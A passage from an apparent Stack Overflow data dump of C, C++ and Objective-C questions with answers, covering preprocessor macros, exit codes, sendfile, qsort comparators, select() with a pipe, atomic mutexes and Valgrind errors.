<p>If the values don't fit in 32 bits but do fit in 63 or 64 bits, you can use <code>long long</code> or <code>unsigned long long</code> (or the fixed-width types <code>int64_t</code> or <code>uint64_t</code> from <code>&lt;stdint.h&gt;</code>) data types to store the result.  If those aren't big enough, then you'll need to use a more complicated solution (e.g. the GMP library has arbitrary-sized integer support), but only do that as a last resort.</p>
"
"<p>Inside a Macro, I can use the stringizing operator <code>#</code>:</p>

<pre><code>#define STRINGIZE(name) #name

cout &lt;&lt; STRINGIZE(SomeClass) &lt;&lt; endl; // Prints ""SomeClass""
</code></pre>

<p>Is it possible to do the opposite, <em>unstringize</em> inside a Macro? How?</p>

<p>For example:</p>

<pre><code>#define RUN_FUNCTION(name) UNSTRINGIZE(name)();

void myFunction {
  cout &lt;&lt; ""Hello!"" &lt;&lt; endl;
}

RUN_FUNCTION(""myFunction"") // Prints ""Hello!""
</code></pre>

<p>If not, is there a reason why?</p>
","9530","","<p>No, it's not possible.  The C++ preprocessor cannot break up tokens into smaller tokens in any way.</p>

<p>What exactly is it that you're trying to do?  There's almost certainly a better way of doing it.</p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/8867871/c-c-return-exit-success-or-0-from-main"">(C/C++) return EXIT_SUCCESS or 0 from main?</a>  </p>
</blockquote>



<p>For a long time I was using return 0;, from the time I started to use allegro. Than I came across C++ book and found about EXIT_SUCCESS, than I looked into stdlib.h or cstdlib where it's defined and there is only two lines:</p>

<pre><code>#define EXIT_SUCCESS 0
#define EXIT_FAILURE 1
</code></pre>

<p>can somebody explain this to me? I am using mingw version of the last devc++ 4.9.9.2.</p>
","9530","","<p>The C99 language standard defines the two macros <code>EXIT_SUCCESS</code> and <code>EXIT_FAILURE</code> to expand to ""integer constant expressions that can be used as the argument to the
<code>exit</code> function to return unsuccessful or successful termination status, respectively, to the
host environment"" (§7.20/3).</p>

<p>In the description of the <code>exit</code> function (§7.20.4.3/5), it also says:</p>

<blockquote>
  <p>Finally, control is returned to the host environment. If the value of <code>status</code> is zero or
  <code>EXIT_SUCCESS</code>, an implementation-defined form of the status <em>successful termination</em> is
  returned. If the value of <code>status</code> is <code>EXIT_FAILURE</code>, an implementation-defined form
  of the status <em>unsuccessful termination</em> is returned. Otherwise the status returned is
  implementation-defined.</p>
</blockquote>

<p>So, if you exit with 0 or <code>EXIT_SUCCESS</code>, that always means ""successful termination"" to the host environment.  <code>EXIT_FAILURE</code> is a value that will always mean ""unsuccessful termination"", but any non-zero value other than those is not guaranteed to be portable.</p>

<p>Note that returning from <code>main</code> is equivalent to calling the <code>exit</code> function with a status of the return value (§5.1.2.2.3).</p>
"
"<p>sendfile() copies data between two file descripters within kernel space. Somewhere I saw if you are writing a web server in C in linux you should use send() and recv() instead of using write() and read(). So is the send() use the kernel space as well?</p>

<p>Whatever I use for sending - sendfile() or send() - on the client side I'll be using recv() right?</p>

<p>On the flip side, <a href=""http://linux.die.net/man/2/send"" rel=""nofollow"">man page</a> says: ""The only difference between send() and write(2) is the presence of flags. With a zero flags argument, send() is equivalent to write(2)."" </p>
","9530","","<p>If <code>fd</code> is a socket file descriptor, then these system calls are identical:</p>

<ul>
<li><code>send(fd, data, length, 0)</code> is the same as <code>write(fd, data, length)</code></li>
<li><code>recv(fd, data, length, 0)</code> is the same as <code>read(fd, data, length)</code></li>
</ul>

<p>So, unless you need to set a non-zero <code>flags</code> parameter, it makes no difference whether you use <code>send/recv</code> or <code>write/read</code>.</p>

<p>The <code>sendfile</code> system call is an optimization.  If you have a socket <code>sockfd</code> and a regular file <code>filefd</code> and you want to copy some file data to the socket (e.g. if you're a web server serving up a file), then you might write it like this:</p>

<pre><code>// Error checking omitted for expository purposes
while(not done)
{
    char buffer[BUFSIZE];
    int n = read(filefd, buffer, BUFSIZE);
    send(sockfd, buffer, n, 0);
}
</code></pre>

<p>However, this is inefficient: this involves the kernel copying the file data into userspace (in the <code>read</code> call) and then copying the same data back into kernel space (in the <code>send</code> call).</p>

<p>The <code>sendfile</code> system call lets us skip all of that copying and have the kernel directly read the file data and send it on the socket in one fell swoop:</p>

<pre><code>sendfile(sockfd, filefd, NULL, BUFSIZE);
</code></pre>
"
"<p>I want to replace the contents of a hidden file, so I attempted to open it in <code>w</code> mode so it would be erased/truncated:</p>

<pre><code>&gt;&gt;&gt; import os
&gt;&gt;&gt; ini_path = '.picasa.ini'
&gt;&gt;&gt; os.path.exists(ini_path)
True
&gt;&gt;&gt; os.access(ini_path, os.W_OK)
True
&gt;&gt;&gt; ini_handle = open(ini_path, 'w')
</code></pre>

<p>But this resulted in a traceback:</p>

<pre><code>IOError: [Errno 13] Permission denied: '.picasa.ini'
</code></pre>

<p>However, I was able to achieve the intended result with <code>r+</code> mode:</p>

<pre><code>&gt;&gt;&gt; ini_handle = open(ini_path, 'r+')
&gt;&gt;&gt; ini_handle.truncate()
&gt;&gt;&gt; ini_handle.write(ini_new)
&gt;&gt;&gt; ini_handle.close()
</code></pre>

<p><strong>Q.</strong> What is the difference between the <code>w</code> and <code>r+</code> modes, such that one has ""permission denied"" but the other works fine?</p>

<p><strong>UPDATE:</strong> I am on win7 x64 using Python 2.6.6, and the target file has its hidden attribute set. When I tried turning off the hidden attribute, <code>w</code> mode succeeds. But when I turn it back on, it fails again.</p>

<p><strong>Q.</strong> Why does <code>w</code> mode fail on hidden files? Is this known behaviour?</p>
","9530","","<p>It's just how the Win32 API works.  Under the hood, Python's <code>open</code> function is calling the <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa363858%28v=vs.85%29.aspx""><code>CreateFile</code></a> function, and if that fails, it translates the Windows error code into a Python <code>IOError</code>.</p>

<p>The <code>r+</code> open mode corresponds to a <code>dwAccessMode</code> of <code>GENERIC_READ|GENERIC_WRITE</code> and a <code>dwCreationDisposition</code> of <code>OPEN_EXISTING</code>.   The <code>w</code> open mode corresponds to a <code>dwAccessMode</code> of <code>GENERIC_WRITE</code> and a <code>dwCreationDisposition</code> of <code>CREATE_ALWAYS</code>.</p>

<p>If you carefully read the remarks in the <code>CreateFile</code> documentation, it says this:</p>

<blockquote>
  <p>If <code>CREATE_ALWAYS</code> and <code>FILE_ATTRIBUTE_NORMAL</code> are specified, <code>CreateFile</code> fails and sets the last error to <code>ERROR_ACCESS_DENIED</code> if the file exists and has the <code>FILE_ATTRIBUTE_HIDDEN</code> or <code>FILE_ATTRIBUTE_SYSTEM</code> attribute. To avoid the error, specify the same attributes as the existing file.</p>
</blockquote>

<p>So if you were calling <code>CreateFile</code> directly from C code, the solution would be to add in <code>FILE_ATTRIBUTE_HIDDEN</code> to the <code>dwFlagsAndAttributes</code> parameter (instead of just <code>FILE_ATTRIBUTE_NORMAL</code>).  However, since there's no option in the Python API to tell it to pass in that flag, you'll just have to work around it by either using a different open mode or making the file non-hidden.</p>
"
"<p>I suspect this is something really simple, but I'm trying to get an int that I have stored in a  dictionary and the line I'm using is this..</p>

<pre><code> int mapX = [NSNumber numberWithInt:[templateObject valueForKey:@""mapX""]];
</code></pre>

<p>But it's giving me the error...</p>

<blockquote>
  <p>Incompatible pointer to integer conversion sending 'id' to parameter
  of type 'int'</p>
</blockquote>

<p>and </p>

<blockquote>
  <p>Incompatible pointer to integer conversion initializing 'int' with an
  expression of type 'NSNumber *'; </p>
</blockquote>

<p>If I try...</p>

<pre><code>NSNumber *mapX = [NSNumber numberWithInt:[templateObject valueForKey:@""mapX""]];
</code></pre>

<p>I basically get the same error. I know I'm probably just using the wrong syntax, but I'm not sure how else to write it.</p>

<p>Thanks for any help.</p>
","9530","","<p>You have two problems.  First, <code>[templateObject valueForKey:@""mapX""]</code> returns an <code>id</code>, which is a pointer to an Objective-C object, not an <code>int</code>.  And since the <code>-[NSNumber numberWithInt:]</code> method takes an <code>int</code> parameter, trying to convert an <code>id</code> to an <code>int</code> is an error.</p>

<p>The second problem is that you try to convert the result of <code>[NSNumber numberWithInt:...]</code> to an <code>int</code>, which is again the same problem: <code>-[NSNumber numberWithInt:]</code> returns a pointer to an <code>NSNumber</code> object, which is not an <code>int</code>.</p>

<p>Assuming that the value stored in your dictionary is in fact an <code>NSNumber</code>, what you really want to do is this:</p>

<pre><code>NSNumber *mapXObj = [templateObject valueForKey:@""mapX""];  // Implicit cast from id to NSNumber*
int mapX = [mapXObj intValue];
</code></pre>

<p>Or more succinctly:</p>

<pre><code>int mapX = [[templateObject valueForKey:@""mapX""] intValue];
</code></pre>
"
"<p>Google's style guide refers to 'order-of-destructor issue' term.</p>

<p>(See the last sentence here: <a href=""http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml?showone=Static_and_Global_Variables#Static_and_Global_Variables"" rel=""nofollow"">http://google-styleguide.googlecode.com/svn/trunk/cppguide.xml?showone=Static_and_Global_Variables#Static_and_Global_Variables</a>).</p>

<p>What does this exactly mean?</p>

<p>p.s.: a quick search over the internet gave me nothing specific regarding this stuff</p>
","9530","","<p>It's referring to the <a href=""http://www.parashift.com/c++-faq/static-init-order.html"" rel=""nofollow"">static initialization order fiasco</a>.  If you have non-POD global objects with constructors or destructors, the order in which objects get initialized in different translation units (read: source files) is not easily controllable.</p>
"
"<p>I'm attempting to sort a struct of students in C. I'm using qsort and doing a simple string comparison. Not sure why I'm getting a seg fault. I am casting and dereferencing the struct appropriately in the comparator function. I've been banging my head on this one for a while.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;math.h&gt;

typedef struct Student {
    char * last;
    char * first;
    char * social;
    int age;
    float gpa;
    enum { ComputerScience = 1, History, Biology } major;
} Student;

void gpa_comp(Student **);
int gpa_comparator(const void * a, const void * b);
void name_comp(Student **);
int name_comparator(const void * a, const void * b);
void make_student_list(Student **);
int student_cmp(const void * a, const void * b);
void print_students (Student ** s, size_t len);
int flt_cmp(const float a, const float b);

int main(int argc, char const *argv[])
{
    int i;
    struct Student ** students = (struct Student **)malloc(5 * sizeof(struct Student *));

    for (i = 0; i &lt; 5; ++i) {
        students[i] = (struct Student *)malloc(sizeof(struct Student));
    }

    make_student_list(students);

    printf(""Students in no order\n"");
    print_students(students, 5);

    printf(""\n"");
    printf(""Students Sorted By First Name Asc\n"");
    name_comp(students);

    return 0;
}

int gpa_comparator(const void * a, const void * b){
    const Student * s1 = (const Student *)a;
    const Student * s2 = (const Student *)b;
    return (int)(100.f*s1-&gt;gpa - 100.f*s2-&gt;gpa);
}

int name_comparator(const void * a, const void * b){
    const Student * s1 = (const Student *) a;
    const Student * s2 = (const Student *) b;
    return strcmp(s1-&gt;first, s2-&gt;first);
}

void print_students (Student ** s, size_t len) {
    int c;
    for (c = 0; c &lt; len; c++){
        printf(""%s - %s - %2f\n"", s[c]-&gt;first, s[c]-&gt;last, s[c] -&gt; gpa);
    }
}

void gpa_comp(Student ** students) {
    size_t len = 5;
    qsort(students, len, len, gpa_comparator);
    print_students(students, len);
}

void name_comp(Student ** students){
    qsort(students, 5, sizeof(Student), name_comparator);
    print_students(students, 5);
}

void make_student_list(Student ** s){
    s[0]-&gt;first = ""Dave"";
    s[0]-&gt;last = ""Johnson"";
    s[0]-&gt;social = ""362-89-3284"";
    s[0]-&gt;major = ComputerScience;
    s[0]-&gt;gpa = 3.5;

    s[1]-&gt;first = ""Sally"";
    s[1]-&gt;last = ""Susie"";
    s[1]-&gt;social = ""251-43-9220"";
    s[1]-&gt;major = History;
    s[1]-&gt;gpa = 3.4;

    s[2]-&gt;first = ""Molly"";
    s[2]-&gt;last = ""Thomas"";
    s[2]-&gt;social = ""123-45-2343"";
    s[2]-&gt;major = Biology;
    s[2]-&gt;gpa = 3.3;

    s[3]-&gt;first = ""Brett"";
    s[3]-&gt;last = ""Bigler"";
    s[3]-&gt;social = ""523-364-3462"";
    s[3]-&gt;major = ComputerScience;
    s[3]-&gt;gpa = 3.9;

    s[4]-&gt;first = ""Sandra"";
    s[4]-&gt;last = ""Salami"";
    s[4]-&gt;social = ""724-457-2455"";
    s[4]-&gt;major = Biology;
    s[4]-&gt;gpa = 4.0;
}
</code></pre>
","9530","","<p>You're sorting an array of <code>Student*</code>, not an array of <code>Student</code>.  So, the call to <code>qsort</code> should pass <code>sizeof(Student*)</code> for the <code>size</code> parameter instead of <code>sizeof(Student)</code>, and the comparator functions need to convert the <code>const void *</code> parameters to <code>Student **</code>, and dereference those twice.</p>

<p>The better solution would probably be to change your array to be just <code>Student*</code> instead of <code>Student**</code>.  Then, you don't need to <code>malloc</code> each individual <code>Student</code> instance, and less code will need to change.</p>
"
"<p>I have following macros:</p>

<pre><code>#define CONCATENATE(arg1, arg2)  arg1##arg2

#define FOR_EACH_1(what, x, ...) what(x)
#define FOR_EACH_2(what, x, ...) what(x) FOR_EACH_1(what, __VA_ARGS__)
#define FOR_EACH_3(what, x, ...) what(x) FOR_EACH_2(what, __VA_ARGS__)
#define FOR_EACH_4(what, x, ...) what(x) FOR_EACH_3(what, __VA_ARGS__)
#define FOR_EACH_5(what, x, ...) what(x) FOR_EACH_4(what, __VA_ARGS__)
#define FOR_EACH_6(what, x, ...) what(x) FOR_EACH_5(what, __VA_ARGS__)
#define FOR_EACH_7(what, x, ...) what(x) FOR_EACH_6(what, __VA_ARGS__)
#define FOR_EACH_8(what, x, ...) what(x) FOR_EACH_7(what, __VA_ARGS__)

#define FOR_EACH_NARG(...) FOR_EACH_NARG_(__VA_ARGS__, FOR_EACH_RSEQ_N())
#define FOR_EACH_NARG_(...) FOR_EACH_ARG_N(__VA_ARGS__)
#define FOR_EACH_ARG_N(_1, _2, _3, _4, _5, _6, _7, _8, N, ...) N
#define FOR_EACH_RSEQ_N() 8, 7, 6, 5, 4, 3, 2, 1, 0

#define FOR_EACH_(N, what, x, ...) CONCATENATE(FOR_EACH_, N)(what, x, __VA_ARGS__)
#define FOR_EACH(what, x, ...) FOR_EACH_(FOR_EACH_NARG(x, __VA_ARGS__), what, x, __VA_ARGS__)
</code></pre>

<p>These are my test cases:</p>

<pre><code>// does not work as intended (with one argument)
#define SOME(x) int x;
FOR_EACH(SOME, y)

// fine with 2 and more
FOR_EACH(SOME, y1, y2);
FOR_EACH(SOME, y3, y4, y5, y6);

// works fine even for one argument
#define ONLY(x) x
int FOR_EACH(ONLY, x);
</code></pre>

<p>Could please someone explain to me what I'm doing wrong for the case with only one argument, <code>#define SOME(x) int x</code>??</p>

<p>Compile it with <code>gcc -E macro.c -o macro.lol</code>, gives result:</p>

<pre><code>int y; int ;  /* &lt;-- that's wrong, why??? */

int y1; int y2;;
int y3; int y4; int y5; int y6;;


int x ;       /* &lt;-- works as supposed */
</code></pre>
","9530","","<p>The problem is that when you pass two arguments to <code>FOR_EACH</code> (just the <code>what</code> and <code>x</code>), the <code>__VA_ARGS__</code> expands to nothing, and you have a trailing comma in the call to <code>FOR_EACH_NARG</code>, so it expands to 2 and therefore expands <code>FOR_EACH_2</code>.</p>

<p>You want to get rid of that trailing comma.  You can do that by either using the <a href=""http://gcc.gnu.org/onlinedocs/cpp/Variadic-Macros.html"" rel=""nofollow"">non-standard extension</a> of using <code>##__VA_ARGS__</code> instead of <code>__VA_ARGS__</code>, which removes the comma before it only if <code>__VA_ARGS__</code> is empty.  For a more standards-compliant version, you can combine the <code>x</code> and <code>__VA_ARGS__</code> into a single parameter:</p>

<pre><code>#define FOR_EACH_(N, what, ...) CONCATENATE(FOR_EACH_, N)(what, __VA_ARGS__)
#define FOR_EACH(what, ...) FOR_EACH_(FOR_EACH_NARG(__VA_ARGS__), what, __VA_ARGS__)
</code></pre>
"
"<p>I have a C++ class, which is referenced, and then i am going to declare a variable.  I declare in objective-c:</p>

<pre><code>cObject obj = cObject();
obj.myFunct(""test"");
</code></pre>

<p>but there seems to be a linker error.  It says:</p>

<pre><code>Undefined symbols for architecture armv7:
  ""cObject::cObject()"", referenced from:
    -[...] in xxx.o
    ___cxxx_global_var_init in xxx.o
""cObject::myFunct(std::__1:basic_string&lt;char,str::__1::char_traits&lt;char&gt;, str::__1::allocator&lt;char&gt; &gt;)"", referenced from:
    -[///] in xxx.o
ld: symbol(s) not found for architecture armv7
clang: error: linker command failed with exit code 1(use -v to see invocation)
</code></pre>

<p><strong>Edit:  First error resolved in comments:</strong> Dont define an empty constructor resolved the first part.  The second part refers to calling  obj.myFunct(""test"");</p>
","9530","","<p>You need to define your class's default constructor and the <code>myFunct</code> function somewhere:</p>

<pre><code>cObject::cObject()
{
    ...
}

return_type cObject::myFunct(std::string arg1)
{
    ...
}
</code></pre>

<p>If they are defined, make sure that you're linking in the object file they're defined in (i.e. add the source file to your Makefile/project file/command line/etc.).</p>
"
"<p>I am developing a Windows application that has a separate thread for processing user (or 3rd party) application input via stdin.</p>

<p>This thread is designed such that it waits via <code>WaitForMultipleObjects</code> on two events:</p>

<ol>
<li><strong>A death signal</strong>.  When this signal is raised, the interface-processing thread shuts down.</li>
<li><strong>An interface signal</strong>.  When this signal is raised, there is input ready to be read.  The input is read and processed.</li>
</ol>

<p>Under Windows this thread enters a main loop where it <code>Wait</code>s for these 2 events (where <code>bWaitAll</code> is <code>FALSE</code>).  Waiting on the stdin handle has the effect of signaling when there is input ready to be read, and the other event is set from elsewhere in the application.</p>

<p>This works exactly as I want.  It waits for an event to be raised without entering in to a busy-wait, and it waits for both event simutaneously.</p>

<p>I wish to port this functionality to Linux, but I'm not sure how to achieve the desired result.  Fundamentally, what I really want is this:</p>

<blockquote>
  <p>Under Linux, how do I design a thread so that it will respond
  immediately to user-input on stdin, yet it can also respond
  immediately to a kill-flag being raised from elsewhere in the
  application?</p>
</blockquote>

<p>In order to accomplish the latter, it seems to me that I cannot use <code>cin</code>, <code>gets</code>, <code>getch</code> or any other function that blocks until the user has entered text.  Yet I do not know how to read user input in a console-based application without blocking.</p>

<p>I'm open to any change in architecture (if there's a more Linux-y way to do this) that include having user input processed in a separate thread that can be terminated from elsewhere in the application.  I'm using GCC 4.4, and Boost 1.51.</p>
","9530","","<p>The standard way of doing this in Linux is to use the <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> system call.  However, <code>select</code> is more limited than <code>WaitForMultipleObjects</code>, in that it can only wait on file descriptors, not other kinds of objects (such as events).  So, the typical way of working around that is to create a pipe and write a dummy value to the pipe as your ""signal"".</p>

<p>Something like this:</p>

<pre><code>// Error checking omitted for expository purposes
int pipefd[2];
pipe(pipefd);  // Create the pipe

while(1)
{
    // Create file descriptor set of stdin and the read end of the pipe
    fd_set fds;
    FD_ZERO(&amp;fds);
    FD_SET(STDIN_FILENO, &amp;fds);
    FD_SET(pipefd[0], &amp;fds);
    int maxfd = MAX(STDIN_FILENO, pipefd[0]);

    // Wait until input becomes available on either stdin or the pipe
    int num_available = select(&amp;fds, NULL, NULL, NULL);

    // Read &amp; process stdin if possible (will not block)
    if (FD_ISSET(STDIN_FILENO, &amp;fds))
    {
        int n = read(STDIN_FILENO, buffer, size);
        ...
    }

    // Read &amp; process pipe if possible (will not block)
    if (FD_ISSET(pipefd[0], &amp;fds))
    {
        char dummy;
        read(pipefd[0], &amp;dummy, 1);
        // Handle signal (e.g. break out of loop)
    }
}
</code></pre>

<p>Then to signal to the thread that it's done, just write a single byte to the write end of the pipe:</p>

<pre><code>char dummy = 42;
write(pipefd[1], &amp;dummy, 1);
</code></pre>
"
"<p>How can I declare a pure virtual member function that is also const? Can I do it like this?</p>

<pre><code>virtual void print() = 0 const;
</code></pre>

<p>or like this?</p>

<pre><code>virtual const void print() = 0;
</code></pre>
","9530","","<p>Only the <code>virtual void print() const = 0</code> form is acceptable.  Take a look at the grammar specification in C++03 §9/2:</p>

<blockquote>
  <p><em>member-declarator</em>:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>declarator pure-specifier<sub>opt</sub></em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>declarator constant-initializer<sub>opt</sub></em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>identifier<sub>opt</sub></em> <code>:</code> <em>constant-expression</em></p>
  
  <p><em>pure-specifier:</em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<code>= 0</code></p>
</blockquote>

<p>The <code>const</code> is part of the <em>declarator</em> -- it's the <em>cv-qualifier-seq<sub>opt</sub></em> in the <em>direct-declarator</em> (§8/4):</p>

<blockquote>
  <p><em>declarator</em>:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>direct-declarator</em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>ptr-operator</em> *declarator*  </p>
  
  <p><em>direct-declarator</em>:<br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>declarator-id</em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>direct-declarator</em> <code>(</code> <em>parameter-declaration-clause</em> <code>)</code> <em>cv-qualifier-seq<sub>opt</sub> exception-specification<sub>opt</sub></em><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<em>direct-declarator</em> <code>[</code> <em>constant-expression<sub>opt</sub></em> <code>]</code><br>
  &nbsp;&nbsp;&nbsp;&nbsp;<code>(</code> <em>declarator</em> <code>)</code></p>
</blockquote>

<p>Hence, the <code>= 0</code> must come after the <code>const</code>.</p>
"
"<p>I scan through the byte representation of an int variable and get somewhat unexpected result.</p>

<p>If I do</p>

<pre><code>int a = 127;
cout &lt;&lt; (unsigned int) *((char *)&amp;a);
</code></pre>

<p>I get 127 as expected. If I do</p>

<pre><code>int a = 256;
cout &lt;&lt; (unsigned int) *((char *)&amp;a + 1);
</code></pre>

<p>I get 1 as expected. But if I do</p>

<pre><code>int a = 128;
cout &lt;&lt; (unsigned int) *((char *)&amp;a);
</code></pre>

<p>I have <strong>4294967168</strong> which is, well… quite fancy. </p>

<p>The question is: is there a way to get 128 when looking at first byte of an int variable which value is 128?</p>
","9530","","<p>For the same reason that <code>(unsigned int)(char)128</code> is 4294967168: <code>char</code> is signed by default on most commonly used systems.  128 cannot fit in a signed 8-bit quantity, so when you cast it to <code>char</code>, you get -128 (0x80 in hex).</p>

<p>Then, when you cast -128 to an <code>unsigned int</code>, you get 2<sup>32</sup> - 128, which is 4294967168.</p>

<p>If you want to get +128, then use an <code>unsigned char</code> instead of <code>char</code>.</p>
"
"<p>I'm trying to implement a mutex in C using the atomic assembly instruction ""bts"" to atomically set a bit and return the original value.
However, when I run the following code, it occasionally deadlocks and often shows race conditions:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;

typedef unsigned char mutex;
#define MUTEX_FREE 0
#define MUTEX_BUSY 1

// adapted from http://www.acm.uiuc.edu/sigops/roll_your_own/i386/atomic.html
mutex testAndSet(mutex *m) {
    int result;
    asm (""bts $0, %1; sbbl %0, %0""
         :""=r"" (result)
         :""m"" (*m)
         :""memory"");
    return (result &amp; 1);
}

void P(mutex *m) {
    // Must use atomic testAndSet to avoid race conditions
    while(testAndSet(m) == MUTEX_BUSY)
        usleep(10);
}

void V(mutex *m) {
    *m = MUTEX_FREE;
}

//////////////
// Test:
//////////////

const int NTHREADS = 100;
const int NINCS = 100;

int counter = 0;
mutex m = MUTEX_FREE;

void criticalSection() {
    int i;
    for(i=0;i&lt;NINCS;i++) {
        P(&amp;m);
        counter++;
        V(&amp;m);
    }
}

int main() {
    int i;
    pthread_t threads[NTHREADS];
    for(i=0; i&lt;NTHREADS; i++) {
        pthread_create(&amp;threads[i], NULL, (void *) &amp;criticalSection, NULL);
    }
    for(i=0; i&lt;NTHREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    printf(""got counter=%d, expected=%d\n"", counter, NTHREADS*NINCS);
}
</code></pre>

<p>The code seems to work if I use the ""xchgb"" instruction instead of ""bts"" as follows:</p>

<pre><code>mutex testAndSet(mutex *m) {
    unsigned char result = MUTEX_BUSY;
    asm (""xchgb %1, %0""
            :""=m"" (*m), ""=r"" (result)
            :""1"" (result)
            :""memory"");
    return result;
}
</code></pre>

<p>Where is the race condition in the original code? Shouldn't the ""bts"" instruction be atomic, guaranteeing thread safety?</p>

<p>Furthermore, is my modified solution actually correct?</p>

<p>(I'm running OS X 10.8 and compiling with gcc.)</p>
","9530","","<p>Try using the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/LOCK.htm"" rel=""nofollow""><code>LOCK</code> prefix</a> to lock the memory bus:</p>

<pre><code>asm (""lock bts $0, %1; ..."");
</code></pre>

<p>The <code>xchg</code> instruction worked because that always asserts the <code>LOCK#</code> signal regardless of the presence or absence of the <code>LOCK</code> prefix.</p>
"
"<p>I am having trouble deciphering the Valgrind output that I am getting.  For example I have an error that says I am doing an illegal write of size 1.  So I added one to the malloc and that doesn't change anything.  Since I have never used Valgrind before, I thought it would be best to get some help after searching online yielded no responses.  Please be aware that I am not looking for the answer so I have not reproduced my code.  I would like to be pushed in the correct direction so that I can combat future errors.
Thanks!</p>

<pre><code>==28881== Memcheck, a memory error detector
==28881== Copyright (C) 2002-2009, and GNU GPL'd, by Julian Seward et al.
==28881== Using Valgrind-3.6.0.SVN-Debian and LibVEX; rerun with -h for copyright info
==28881== Command: ./sws root
==28881==
==28892== Conditional jump or move depends on uninitialised value(s)
==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)
==28892==    by 0x4040B7: get_headers (html.c:280)
==28892==    by 0x402D77: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Conditional jump or move depends on uninitialised value(s)
==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)
==28892==    by 0x4040C5: get_headers (html.c:280)
==28892==    by 0x402D77: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Conditional jump or move depends on uninitialised value(s)
==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)
==28892==    by 0x4040D3: get_headers (html.c:280)
==28892==    by 0x402D77: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Conditional jump or move depends on uninitialised value(s)
==28892==    at 0x4C286D9: __GI_strlen (mc_replace_strmem.c:284)
==28892==    by 0x4040E1: get_headers (html.c:280)
==28892==    by 0x402D77: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid write of size 1
==28892==    at 0x4C2874C: strcpy (mc_replace_strmem.c:311)
==28892==    by 0x4041E1: get_headers (html.c:299)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid write of size 1
==28892==    at 0x4C2875F: strcpy (mc_replace_strmem.c:311)
==28892==    by 0x4041E1: get_headers (html.c:299)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be034 is 4 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid read of size 1
==28892==    at 0x4C28374: strcat (mc_replace_strmem.c:176)
==28892==    by 0x4041F7: get_headers (html.c:300)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==  Address 0x53be030 is 0 bytes after a block of size 32 alloc'd
==28892==    at 0x4C274A8: malloc (vg_replace_malloc.c:236)
==28892==    by 0x402D84: read_page (networking.c:341)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
==28892==
==28892== Invalid write of size 1
==28892==    at 0x4C2838C: strcat (mc_replace_strmem.c:176)
==28892==    by 0x4041F7: get_headers (html.c:300)
==28892==    by 0x402E00: read_page (networking.c:347)
==28892==    by 0x402B8E: get_page (networking.c:310)
==28892==    by 0x40268E: header_parse (networking.c:232)
==28892==    by 0x401D96: retrieve_msg (networking.c:62)
==28892==    by 0x401AAB: main (sws.c:139)
